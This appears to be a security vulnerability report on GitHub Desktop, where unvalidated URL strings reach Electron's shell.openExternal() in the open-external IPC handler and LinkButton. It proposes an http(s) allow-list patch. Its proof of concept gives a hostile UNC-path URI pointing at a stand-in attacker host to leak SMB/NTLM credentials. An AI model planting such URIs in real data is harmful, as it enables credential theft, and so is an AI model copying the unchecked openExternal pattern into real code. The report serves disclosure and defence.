## Title
Missing URL-protocol whitelist before `shell.openExternal()` allows non-http(s) URI schemes to reach the OS shell — (File: `app/src/main-process/main.ts`, `app/src/ui/lib/link-button.tsx`)

### Summary
The external report flags that `ExplorerLink.tsx`/`ManageChainsItem.tsx` pass user-controlled URLs through `xss()` and into `href` without checking the URL scheme, so a `javascript:` URI can slip through. The exact analog exists in GitHub Desktop: the `open-external` IPC handler and the renderer-side `LinkButton` component pass arbitrary, potentially attacker-influenced strings straight to Electron's `shell.openExternal()` with no protocol allow-list. `shell.openExternal()` hands the string to the OS shell/registry (e.g. `ShellExecute` on Windows), so unlike a browser `href`, a non-`http(s)` scheme here is not merely inert — it can trigger installed protocol handlers, UNC paths, or other OS-level behavior.

### Finding Description
`LinkButton` renders an anchor and, on click, invokes `shell.openExternal(uri)` for whatever `uri` was passed in, with no scheme check at all: [1](#0-0) 

That `uri` prop is populated throughout the UI from GitHub-API-derived objects — e.g. `user.html_url`, PR/comment `externalURL`, `gitHubRepository.htmlURL`-derived strings — which for a self-hosted GitHub Enterprise Server endpoint (an account/endpoint the app fully trusts and treats as a "GitHub API object") is server-controlled data, not something Desktop validates as http(s) before use: [2](#0-1) 

The underlying `shell.openExternal` implementation itself has no protocol allow-list; it is a thin forward to Electron and to the main-process IPC handler: [3](#0-2) 

The main-process IPC handler that actually performs the call only *inspects* the scheme for logging purposes — it never rejects or sanitizes non-`http(s)` values before calling `shell.openExternal(path)`: [4](#0-3) 

This is the same broken invariant as the report ("no protocol whitelist enforced before an href/open call"), but the impact is stronger here because the sink is not a DOM `<a href>` (browser-sandboxed, `javascript:` inert without a click in a web context) but `Electron.shell.openExternal`, which passes the raw string to the operating system's URL/protocol dispatch (`ShellExecuteExW` on Windows, `LSOpenCFURLRef` on macOS). Non-`http(s)` schemes such as `file://\\attacker-host\share` (SMB/NTLM credential leak), custom app-registered protocol handlers with attacker-controlled arguments, or other OS URI-launch primitives are known Electron `shell.openExternal` RCE/IPC-escape classes when no scheme allow-list is enforced — which is exactly the pattern GitHub Desktop uses. Notably, Desktop **does** correctly enforce an `/^https?:/` check for one specific rendering path — the sandboxed markdown link interceptor: [5](#0-4) 

showing the project is aware this guard is needed for user-influenced content, yet the same guard is absent from `LinkButton` and from the `open-external` IPC boundary that all `LinkButton`/`dispatcher.openInBrowser` calls ultimately funnel through.

### Impact Explanation
If an attacker controls the identity/comment/repository metadata returned by a GitHub Enterprise Server endpoint the victim has added as an account (or otherwise influences a string that reaches `LinkButton uri={...}` or `dispatcher.openInBrowser(url)`), clicking that link causes Desktop to call `shell.openExternal()` on an unvalidated string. Depending on OS and installed protocol handlers this can result in: SMB/NTLM hash leakage via `file://\\host\share` UNC paths, invocation of vulnerable third-party custom URI-scheme handlers with attacker-supplied arguments, or other file/process interactions outside the repository — i.e. code execution or credential exfiltration triggered by a link the user clicks, consistent with the accepted impact class.

### Likelihood Explanation
Medium. It requires the user to click a rendered link (`LinkButton`) or otherwise trigger `dispatcher.openInBrowser`/`shell.openExternal` with attacker-influenced data (e.g. a malicious/compromised GHES instance, or any other API-object field surfaced as a `uri`). No local access, no admin rights, and no pre-existing malware are required — only that Desktop is pointed at (or accepts data from) an untrusted API endpoint and the user clicks the resulting link, which is a normal, expected interaction pattern (this mirrors the original report's "user clicks a manipulated link" scenario).

### Recommendation
Centralize scheme enforcement at the lowest common choke point — the `open-external` IPC handler in `app/src/main-process/main.ts` — so every caller (including `LinkButton`, `dispatcher.openInBrowser`, and `_openInBrowser`) is protected regardless of call site:

```ts
ipcMain.handle('open-external', async (_, path: string) => {
  let url: URL
  try {
    url = new URL(path)
  } catch {
    return false
  }
  if (!['http:', 'https:'].includes(url.protocol)) {
    log.warn(`Blocked openExternal for disallowed protocol: ${url.protocol}`)
    return false
  }
  try {
    await shell.openExternal(url.toString())
    return true
  } catch (e) {
    log.error(`Call to openExternal failed: '${e}'`)
    return false
  }
})
```
Additionally, apply the same `/^https?:/` check already used in `sandboxed-markdown.tsx`'s `setupLinkInterceptor` inside `LinkButton.onClick` before calling `shell.openExternal`, so the defense is layered rather than relying solely on the IPC boundary.

### Proof of Concept
1. Add (or compromise) a GitHub Enterprise Server account whose API responses are attacker-influenced, or otherwise get an attacker-controlled string into any prop consumed as `LinkButton uri={...}` (e.g. `user.html_url`, PR `externalURL`).
2. Set that value to a non-http(s) URI, e.g. `file://\\attacker.example.com\share\payload` or a registered custom scheme with crafted arguments.
3. The victim opens the relevant Desktop view (e.g. a PR review comment) and clicks the rendered link.
4. `LinkButton.onClick` (app/src/ui/lib/link-button.tsx:76-92) calls `shell.openExternal(uri)` unconditionally.
5. This IPCs into `ipcMain.handle('open-external', ...)` (app/src/main-process/main.ts:581-597), which only logs for `http(s)` and otherwise passes the raw string straight to `shell.openExternal(path)` — no rejection occurs for other schemes, resulting in the OS shell processing the attacker-supplied URI.
